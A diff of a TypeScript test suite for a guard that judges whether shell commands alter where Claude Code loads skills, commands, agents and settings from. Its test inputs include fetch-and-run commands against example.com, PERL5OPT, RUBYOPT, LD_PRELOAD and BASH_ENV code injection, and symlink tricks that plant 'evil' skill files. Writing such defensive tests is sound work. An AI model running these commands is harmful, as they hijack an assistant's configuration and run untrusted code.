@@ -283,7 +283,7 @@ describe('what a shell command changes where Claude Code loads from', () => {
     expect(await change('ln -s /work/review ~/.claude/skills/review')).toMatchObject({ kind: 'unreadable', reason: expect.stringContaining('no scan can pin') })
   })
 
-  test('a clone is scanned at its commit; a download, an archive or an edit is Could not verify', async () => {
+  test('a clone is scanned at its commit; a download or an archive is Could not verify; an edit is looked at once made', async () => {
     expect(await change('git clone https://github.com/acme/review ~/.claude/skills/review')).toMatchObject({ kind: 'clone', spec: { url: 'https://github.com/acme/review.git' } })
     expect(await change('git clone git@github.com:acme/review.git ~/.claude/skills/review')).toMatchObject({ kind: 'unreadable', reason: expect.stringContaining('https://') })
     expect(await change('curl -o ~/.claude/skills/x/SKILL.md https://example.com/s.md')).toMatchObject({ kind: 'unreadable', reason: expect.stringContaining('a download would land there') })
@@ -292,7 +292,8 @@ describe('what a shell command changes where Claude Code loads from', () => {
     // Unpacked into a folder that holds the home folder, it can reach ~/.claude.
     expect(await change('tar -xzf x.tgz -C ~')).toMatchObject({ kind: 'unreadable', reason: expect.stringContaining('as a whole') })
     expect(await change('tar -xzf x.tgz -C /tmp/x')).toEqual({ kind: 'pass' })
-    expect(await change("sed -i '' 's/a/b/' ~/.claude/settings.json")).toMatchObject({ kind: 'unreadable', reason: expect.stringContaining('an edit sed makes') })
+    // An edit in place brings nothing in: it runs, and what it made is judged then.
+    expect(await change("sed -i '' 's/a/b/' ~/.claude/settings.json")).toMatchObject({ kind: 'watch', reason: expect.stringContaining('an edit sed makes'), named: [`${HOME}/.claude/settings.json`] })
     expect(await change('cp a ~/.claude/plugins/cache/x/a')).toMatchObject({ kind: 'unreadable', reason: expect.stringContaining('plugin Claude Code installed') })
   })
 
@@ -310,53 +311,56 @@ describe('what a shell command changes where Claude Code loads from', () => {
     // The files code names are read from where it runs: after a `cd`, whatever the session's folder.
     const edit = `cd /home/tester && python3 - <<'EOF'\np='.claude/commands/expenses.md'; s=open(p).read()\nopen(p,'w').write(s.replace('Sort', 'Group'))\nEOF`
     expect(await change(edit)).toMatchObject({ ...note('the command'), label: `a change to ${HOME}/.claude/commands/expenses.md` })
-    expect(await change(edit.replace('cd /home/tester', 'cd "$X"'))).toMatchObject({ kind: 'unreadable' })
+    // Anything else such code makes is looked at once it has run.
+    expect(await change(edit.replace('cd /home/tester', 'cd "$X"'))).toMatchObject({ kind: 'watch' })
     // PR review: never from the session's folder instead, where a file of the same name says nothing of the one made here.
-    expect(await change(`cd /tmp && python3 -c "open('.claude/commands/expenses.md','w').write('x')"`, HOME)).toMatchObject({ kind: 'unreadable' })
-    // Every piece of code must edit files already there: a new skill beside an edit is brought in.
-    expect(await change(`${edit}\npython3 -c "open('/home/tester/.claude/skills/new/SKILL.md','w').write('x')"`)).toMatchObject({ kind: 'unreadable' })
+    expect(await change(`cd /tmp && python3 -c "open('.claude/commands/expenses.md','w').write('x')"`, HOME)).toMatchObject({ kind: 'watch' })
+    // Every piece of code must edit files already there for a note: a new skill beside an edit is looked at once made.
+    expect(await change(`${edit}\npython3 -c "open('/home/tester/.claude/skills/new/SKILL.md','w').write('x')"`)).toMatchObject({ kind: 'watch' })
     expect(await change(`${edit}\npython3 -c "p='/home/tester/.claude/skills/old/SKILL.md'; open(p,'w').write(open(p).read())"`)).toMatchObject(note('each one'))
   })
 
-  test('what is brought into a skill or command, and an edit anywhere else, is still held', async () => {
-    const held = { kind: 'unreadable' }
+  test('what is brought into a skill or command is still held; an edit anywhere else is looked at once made', async () => {
     for (const command of [
       // A download, even over a skill already there, brings something in.
       'curl -fsSL -o ~/.claude/skills/old/SKILL.md https://example.com/s.md',
       'unzip -o skill.zip -d ~/.claude/skills/old',
-      // Code writing a skill or command that is not there yet makes a new one.
-      `python3 -c "open('/home/tester/.claude/commands/new.md','w').write('x')"`,
-      `python3 -c "open('/home/tester/.claude/commands/expenses.md','w').write('x'); open('/home/tester/.claude/settings.json','w').write('{}')"`,
-      // Nothing checks an agent, a settings file or a plugin's files before they are used.
-      "sed -i '' 's/Help/Assist/' ~/.claude/agents/helper.md",
-      "sed -i '' 's/a/b/' ~/.claude/settings.json",
-      "sed -i '' 's/a/b/' ~/.claude/plugins/cache/x/SKILL.md",
-      // A backup sed keeps where Claude Code loads from is a copy of another file brought in.
+      // A backup sed or perl keeps where Claude Code loads from is a copy of another file brought in.
       "sed -i'/home/tester/.claude/commands/*' 's/a/b/' /tmp/notes.md",
       "sed -i.md 's/a/b/' ~/.claude/commands/expenses",
       `S=.md; sed -i "$S" -e 's/a/b/' ~/.claude/commands/expenses.md`,
-      // An edit by an interpreter that loads code the guard does not read, where nothing checks it before it is used.
+      `perl -pi'~/.claude/skills/evil/*' -e '' SKILL.md`,
+      // A file written by an interpreter that loads code the guard does not read is no edit.
       "PERL5OPT=-MEvil perl -pi -e 's/a/b/' ~/.claude/agents/helper.md",
       "export RUBYOPT=-revil; ruby -pi -e 'gsub(/a/, %q(b))' ~/.claude/settings.json",
       // PR review: code a variable loads is never an edit of the skill or command files the command names, even its own.
       "PERL5OPT=-MEvil perl -pi -e 's/a/b/' ~/.claude/commands/expenses.md",
-      "BASH_ENV=~/.claude/skills/old/SKILL.md bash -c 'echo ok'",
-      'LD_PRELOAD=/tmp/x.so /usr/bin/true ~/.claude/settings.json',
       // PR review, round two: a file named relative to the session's folder, which is Claude's own.
       ["PERL5OPT=-MEvil perl -pi -e 's/a/b/' settings.json", `${HOME}/.claude`],
-      // An edit beside a change elsewhere, a new command beside an edit, or a copy whose source cannot be read.
-      "sed -i '' 's/a/b/' ~/.claude/commands/expenses.md ~/.claude/settings.json",
+      // A new command beside an edit, or a copy whose source cannot be read.
       "sed -i '' 's/a/b/' ~/.claude/commands/expenses.md && echo x > ~/.claude/commands/new.md",
       'cp "$SRC" ~/.claude/commands/new.md',
     ] as (string | [string, string])[]) {
-      expect(await (typeof command === 'string' ? change(command) : change(...command))).toMatchObject(held)
+      expect(await (typeof command === 'string' ? change(command) : change(...command))).toMatchObject({ kind: 'unreadable' })
     }
+    // Nothing checks an agent, a settings file or a plugin's files before they are used, so an edit there, or code
+    // that writes there, runs and is judged by what it made; a skill or command it makes is checked before it is used.
+    for (const command of [
+      `python3 -c "open('/home/tester/.claude/commands/new.md','w').write('x')"`,
+      `python3 -c "open('/home/tester/.claude/commands/expenses.md','w').write('x'); open('/home/tester/.claude/settings.json','w').write('{}')"`,
+      "sed -i '' 's/Help/Assist/' ~/.claude/agents/helper.md",
+      "sed -i '' 's/a/b/' ~/.claude/settings.json",
+      "sed -i '' 's/a/b/' ~/.claude/plugins/cache/x/SKILL.md",
+      "BASH_ENV=~/.claude/skills/old/SKILL.md bash -c 'echo ok'",
+      'LD_PRELOAD=/tmp/x.so /usr/bin/true ~/.claude/settings.json',
+      "sed -i '' 's/a/b/' ~/.claude/commands/expenses.md ~/.claude/settings.json",
+    ]) expect(await change(command)).toMatchObject({ kind: 'watch' })
   })
 
   test('local review: a copied link, another user\'s home, and a folder CLAUDE_CONFIG_DIR names', async () => {
     const linked = memoryHost(HOME, { ...files, 'proj/linked.md': { link: 'deploy.md' } })
     expect(await readShellChange(linked, 'cp linked.md ~/.claude/commands/', PROJECT)).toMatchObject({ kind: 'unreadable', reason: expect.stringContaining('which is a link') })
-    expect(await change(`awk 'BEGIN { print "x" > "/home/tester/.claude/settings.json" }'`)).toMatchObject({ kind: 'unreadable', reason: expect.stringContaining('awk runs a program that may write files') })
+    expect(await change(`awk 'BEGIN { print "x" > "/home/tester/.claude/settings.json" }'`)).toMatchObject({ kind: 'watch', reason: expect.stringContaining('awk runs a program that may write files'), named: ['/home/tester/.claude/settings.json'] })
     expect(await change("echo '{}' > ~root/.claude/settings.json")).toMatchObject({ kind: 'unreadable', reason: expect.stringContaining('relative to a folder only known') })
     const custom = async () => '/opt/claude'
     expect(await readShellChange(host, "echo '{}' > /opt/claude/settings.json", PROJECT, custom)).toMatchObject({ kind: 'write', input: { file_path: '/opt/claude/settings.json' }, configDir: '/opt/claude' })
@@ -394,11 +398,14 @@ describe('what a shell command changes where Claude Code loads from', () => {
     expect(flagged).toEqual([])
   })
 
-  test('more than one change, or code that names Claude\'s folder, is Could not verify', async () => {
+  test('more than one change is Could not verify; code that names Claude\'s folder is looked at once it runs', async () => {
     expect(await change('echo a > ~/.claude/commands/a.md; echo b > ~/.claude/commands/b.md')).toMatchObject({ kind: 'unreadable', label: '2 changes by one command' })
-    expect(await change(`python3 -c "open('/home/tester/.claude/skills/x/SKILL.md','w').write('x')"`)).toMatchObject({ kind: 'unreadable', reason: expect.stringContaining('python3 runs code that may write files or run programs') })
+    expect(await change(`python3 -c "open('/home/tester/.claude/skills/x/SKILL.md','w').write('x')"`)).toMatchObject({ kind: 'watch', reason: expect.stringContaining('python3 runs code that may write files or run programs'), named: ['/home/tester/.claude/skills/x/SKILL.md'], cwd: PROJECT })
     expect(await change(`D=~/.claude/skills; cp -r review "$D"`)).toMatchObject({ kind: 'folder', claim: `${SKILLS}/review` })
-    expect(await change(`D=$(echo ~/.claude/skills); cp -r review "$D"`)).toMatchObject({ kind: 'unreadable', reason: expect.stringContaining('only known as it runs') })
+    expect(await change(`D=$(echo ~/.claude/skills); cp -r review "$D"`)).toMatchObject({ kind: 'watch', reason: expect.stringContaining('only known as it runs') })
+    // Local review: a relative path is read from where its own part runs, after a `cd` between the parts.
+    const later = await change(`python3 -c "open('/home/tester/.claude/agents/a.md','w').write('x')" && cd /home/tester/other && python3 -c "open('.claude/settings.json','w').write('{}')"`)
+    expect(later).toMatchObject({ kind: 'watch', named: ['/home/tester/.claude/agents/a.md', '/home/tester/other/.claude/settings.json'], cwd: PROJECT })
     expect(await change('python3 build.py')).toEqual({ kind: 'pass' })
     expect(await change('cd "$X" && echo a > b')).toEqual({ kind: 'pass' })
     expect(await change('cd "$X" && echo a > .claude/commands/a.md')).toMatchObject({ kind: 'unreadable', reason: expect.stringContaining('relative to a folder only known') })
@@ -421,15 +428,14 @@ describe('what a shell command changes where Claude Code loads from', () => {
       `ruby -pi -e '$_.gsub!(/old/, '"'"'load the remove step'"'"')' .claude/CLAUDE.md`,
     ]) expect(await change(command)).toEqual({ kind: 'pass' })
     expect(readShellCommand(lookup)).toEqual({ kind: 'pass', browse: false })
-    // `command` without -v runs what follows; an in-place edit where Claude Code loads from waits, but for a skill's
-    // or command's (checked before it is used); code that may do more stays unseen.
+    // `command` without -v runs what follows; an in-place edit where Claude Code loads from, and code that may do more,
+    // run and are looked at once they have, but for a skill's or command's (checked before it is used).
     for (const [command, reason] of [
       ['ls ~/.claude/skills; command $c', 'it runs a program only known as it runs'],
       ['ls ~/.claude/skills; command -p $c', 'it runs a program only known as it runs'],
       [`perl -pi -e 's/a/b/' ~/.claude/agents/x.md`, 'an edit perl makes would land there'],
       [`ruby -pi -e 'gsub(/a/, %q(b))' ~/.claude/settings.json`, 'an edit ruby makes would land there'],
       [`ruby -C ~/.claude/agents -i -pe 'gsub(/a/, %q(b))' x.md`, 'an edit ruby makes would land there'],
-      [`perl -pi'~/.claude/skills/evil/*' -e '' SKILL.md`, 'the copy perl keeps of the file it edits would land there'],
       // The edit that passes above, with code that does more than edit.
       [`perl -pi -e 'system("x")' .claude/settings.json`, 'perl runs code that may write files or run programs'],
       [`ruby -pi -e 'system("x")' .claude/settings.json`, 'ruby runs code that may write files or run programs'],
@@ -466,10 +472,10 @@ describe('what a shell command changes where Claude Code loads from', () => {
       [`ruby -pi -e 'BEGIN { Dir.chdir(%q(/home/tester/.claude/skills/x)) }; gsub(/a/, %q(b))' SKILL.md`, 'ruby edits files in place that its code chooses as it runs'],
       [`ls ~/.claude/skills/*/SKILL.md | xargs perl -pi -e 's/a/b/'`, 'perl is given paths from its input'],
       [`perl -ne 'BEGIN { $^I = "" } print' ~/.claude/settings.json`, 'perl runs code that may write files or run programs'],
-    ]) expect(await change(command as string)).toMatchObject({ kind: 'unreadable', reason: expect.stringContaining(reason as string) })
+    ]) expect(await change(command as string)).toMatchObject({ kind: 'watch', reason: expect.stringContaining(reason as string) })
   })
 
-  test('inline code that names Claude\'s folder is held only when it may change something', async () => {
+  test('inline code that names Claude\'s folder is looked at once it runs only when it may change something', async () => {
     // The command the guard held while checking its own release: it only reads and prints.
     const reading = `cd /Users/boaz/Documents/Projects/ai-install-guard && git ls-remote origin refs/heads/release; python3 -c "import json; d=json.load(open('/Users/boaz/.claude/plugins/marketplaces/ai-install-guard/.claude-plugin/marketplace.json')); print([ (p['name'], p['source'], p.get('version')) for p in d['plugins']])"; gh run list --workflow release.yml --limit 2 2>&1 | head -3`
     expect(await change(reading)).toEqual({ kind: 'pass' })
@@ -499,7 +505,7 @@ describe('what a shell command changes where Claude Code loads from', () => {
       `python3 <<EOF\nopen("$TARGET")\nEOF\n# ~/.claude`,
       `node -e "require('fs').readFileSync('/home/tester/.claude/settings.json', {flag:'w'})"`,
       `node -e "const fs = require('fs'); fs.closeSync(fs.openSync('/home/tester/.claude/settings.json', fs.constants.O_TRUNC))"`,
-    ]) expect(await change(command)).toMatchObject({ kind: 'unreadable' })
+    ]) expect(await change(command)).toMatchObject({ kind: 'watch' })
     // Reading through os and fs stays a read, and data passed beside fixed code is no code.
     for (const command of [
       `python3 -c "import os; print(os.listdir(os.path.expanduser('~/.claude/skills')))"`,
@@ -556,12 +562,16 @@ describe('what a shell command changes where Claude Code loads from', () => {
       // Code run in a place Claude Code loads from may write there by any name.
       `cd ~/.claude/skills/old && python3 -c "open('SKILL.md', 'w').write('evil')"`,
       `cd ~/.claude && python3 -c "import json; json.dump({}, open('settings.json', 'w'))"`,
-      // A script the command writes and then runs is read: as commands for a shell, as inline code for an interpreter.
-      `cat > /tmp/x.sh <<'EOF'\ncp evil.md ~/.claude/skills/x/SKILL.md\nEOF\nbash /tmp/x.sh`,
-      `printf 'cp evil.md ~/.claude/skills/x/SKILL.md\\n' > /tmp/x.sh; chmod +x /tmp/x.sh; /tmp/x.sh`,
+      // A script the command writes and an interpreter runs is read as inline code.
       `cat > /tmp/x.py <<'EOF'\nimport os\nopen(os.path.expanduser('~/.claude/skills/x/SKILL.md'), 'w').write('evil')\nEOF\npython3 /tmp/x.py`,
       // Made by code the guard does not read, the script counts with that code's text, all of it.
       `python3 - <<'EOF'\nopen('/tmp/x.sh', 'w').write("""cp evil.md ~/.claude/skills/x/SKILL.md\n""")\nEOF\nbash /tmp/x.sh`,
+    ]) expect(await change(command)).toMatchObject({ kind: 'watch' })
+    // A script the command writes and a shell runs is read as commands, so what it copies in is judged before it runs;
+    // one given the skills folder may write over it as a whole.
+    for (const command of [
+      `cat > /tmp/x.sh <<'EOF'\ncp evil.md ~/.claude/skills/x/SKILL.md\nEOF\nbash /tmp/x.sh`,
+      `printf 'cp evil.md ~/.claude/skills/x/SKILL.md\\n' > /tmp/x.sh; chmod +x /tmp/x.sh; /tmp/x.sh`,
       `curl -so /tmp/x.sh https://example.com/x.sh && bash /tmp/x.sh ~/.claude/skills`,
     ]) expect(await change(command)).toMatchObject({ kind: 'unreadable' })
     // A script edited and then run, or one a program is only given, is no more than the edit; a script it writes that runs nothing there passes.
@@ -585,7 +595,7 @@ describe('what a shell command changes where Claude Code loads from', () => {
       `python3 -c "import glob; [open(p,'a') for p in glob.glob('/home/tester/.claude/projects/*/x.jsonl')]"`,
       `perl -pi -e 'system("x")' .claude/CLAUDE.md`,
     ]) expect(await change(command)).toEqual({ kind: 'pass' })
-    // What it loads, reached through such a path, by a name built as the code runs, or by the folder alone, still counts.
+    // What it loads, reached through such a path, by a name built as the code runs, or by the folder alone, is looked at once the code runs.
     for (const command of [
       `python3 -c "open('/home/tester/.claude/projects/x/../../skills/y/SKILL.md','w').write('x')"`,
       `python3 -c "open('/home/tester/proj/.claude/worktrees/w/.claude/skills/y/SKILL.md','w').write('x')"`,
@@ -609,44 +619,44 @@ describe('what a shell command changes where Claude Code loads from', () => {
       `python3 -c "import os; p = '/home/tester/.claude/projects/x'; open(os.sep.join([p, '..', '..', 'settings.json']), 'w')"`,
       `ln -s ~/.claude/skills .claude/shortcut && python3 -c "open('.claude/shortcut/new.md','w').write('x')"`,
       `python3 -c "import os; os.symlink(target, '.claude/shortcut'); open('.claude/shortcut/new.md','w').write('x')"`,
-    ]) expect(await change(command)).toMatchObject({ kind: 'unreadable' })
+    ]) expect(await change(command)).toMatchObject({ kind: 'watch' })
     // PR review, round two: a character written as an escape, a root only known as it runs, and a link into the folder CLAUDE_CONFIG_DIR names.
     for (const command of [
       `python3 -c "open('/home/tester/.claude/projects\\x2f..\\x2fsettings.json','w').write('{}')"`,
       `python3 -c "import os; open(os.environ['ROOT'] + '/.claude/cache/new.md','w').write('x')"`,
       `python3 -c "open(f'{root}/.claude/cache/new.md','w').write('x')"`,
       `python3 -c 'import os; open(os.path.expandvars("$HOME/.claude/cache/settings.json"), "w").write("{}")'`,
-    ]) expect(await change(command)).toMatchObject({ kind: 'unreadable' })
+    ]) expect(await change(command)).toMatchObject({ kind: 'watch' })
     // PR review, round three: a link moved into place first, by any of the ways code moves a file.
     for (const command of [
       `python3 -c "import os; os.rename('/tmp/incoming', '/home/tester/.claude/x'); open('/home/tester/.claude/x','w').write('{}')"`,
       `python3 -c "import os; os.replace('/tmp/incoming', '/home/tester/.claude/x'); open('/home/tester/.claude/x','w').write('{}')"`,
       `python3 -c "from pathlib import Path; Path('/tmp/incoming').replace(target); open('/home/tester/.claude/x','w').write('{}')"`,
       `python3 -c "import shutil; shutil.move('/tmp/incoming', '/home/tester/.claude/x'); open('/home/tester/.claude/x','w').write('{}')"`,
-    ]) expect(await change(command)).toMatchObject({ kind: 'unreadable' })
+    ]) expect(await change(command)).toMatchObject({ kind: 'watch' })
     // Round four: strings written side by side are one string.
-    expect(await change(`python3 -c "open('.claude/ski' 'lls/new/SKILL.md','w').write('x')"`)).toMatchObject({ kind: 'unreadable' })
-    expect(await change(`python3 -c "open('/home/tester/.claude/projects' f'/{x}/../../settings.json','w').write('x')"`)).toMatchObject({ kind: 'unreadable' })
+    expect(await change(`python3 -c "open('.claude/ski' 'lls/new/SKILL.md','w').write('x')"`)).toMatchObject({ kind: 'watch' })
+    expect(await change(`python3 -c "open('/home/tester/.claude/projects' f'/{x}/../../settings.json','w').write('x')"`)).toMatchObject({ kind: 'watch' })
     // A character made as the code runs, an escape that is no path character, and text written beside it, pass;
-    // a copy that may bring a link into Claude's folder first does not.
+    // a copy that may bring a link into Claude's folder first is looked at too.
     for (const command of [
       `F=/home/tester/.claude/projects/a.jsonl; python3 -c "import sys; d=open(sys.argv[1]).read().replace(chr(10),' '); open('out.txt','w').write(d)" "$F"`,
       `python3 -c "d=open('/home/tester/.claude/projects/a.jsonl').read(); open('out.txt','w').write('\\x1b[1m' + d)"`,
       `M=/home/tester/.claude/projects/p/memory; cat > "$M/x.md" <<'EOF'\nhi\nEOF\npython3 -c "p='$M/MEMORY.md'; s=open(p).read(); open(p,'w').write(s + 'x')"`,
     ]) expect(await change(command)).toEqual({ kind: 'pass' })
-    expect(await change(`cp -R /tmp/links /home/tester/.claude/x && python3 -c "open('/home/tester/.claude/x/a','w').write('x')"`)).toMatchObject({ kind: 'unreadable' })
+    expect(await change(`cp -R /tmp/links /home/tester/.claude/x && python3 -c "open('/home/tester/.claude/x/a','w').write('x')"`)).toMatchObject({ kind: 'watch' })
     // A string's own replace is no move.
     expect(await change(`python3 -c "p='/home/tester/.claude/projects/x.md'; s=open(p).read(); open(p,'w').write(s.replace('a', 'b'))"`)).toEqual({ kind: 'pass' })
     const configured = `python3 -c "open('/home/tester/.claude/elsewhere/new/SKILL.md','w').write('x')"`
-    expect(await readShellChange(host, configured, PROJECT, async () => `${HOME}/cfg`)).toMatchObject({ kind: 'unreadable' })
+    expect(await readShellChange(host, configured, PROJECT, async () => `${HOME}/cfg`)).toMatchObject({ kind: 'watch' })
     // A path given whole, from a root written out, reaches only what it names; another folder's `.claude` is not yours.
     expect(await change(`python3 -c "import json; d = json.load(open('/home/tester/.claude/projects/x.json')); open('out.json','w').write('x')"`)).toEqual({ kind: 'pass' })
     expect(await change(`python3 -c "open('/home/tester/proj/.claude/log','w').write('x')"`)).toEqual({ kind: 'pass' })
     expect(await change(`python3 -c 'import os; d = open(os.path.expandvars("$HOME/.claude/projects/x.json")).read(); open("out.json", "w").write(d)'`)).toEqual({ kind: 'pass' })
-    expect(await change(`python3 -c "open('/home/tester/.claude/log','w').write('x')"`)).toMatchObject({ kind: 'unreadable' })
+    expect(await change(`python3 -c "open('/home/tester/.claude/log','w').write('x')"`)).toMatchObject({ kind: 'watch' })
     // A mode belongs to open only inside its own parentheses.
     expect(await change(`python3 -c 'print(open(".claude/settings.json", "r"), "w")'`)).toEqual({ kind: 'pass' })
-    expect(await change(`python3 -c "print('x', file=open(os.path.join(home, '.claude/settings.json'), 'w'))"`)).toMatchObject({ kind: 'unreadable' })
+    expect(await change(`python3 -c "print('x', file=open(os.path.join(home, '.claude/settings.json'), 'w'))"`)).toMatchObject({ kind: 'watch' })
   })
 })
 
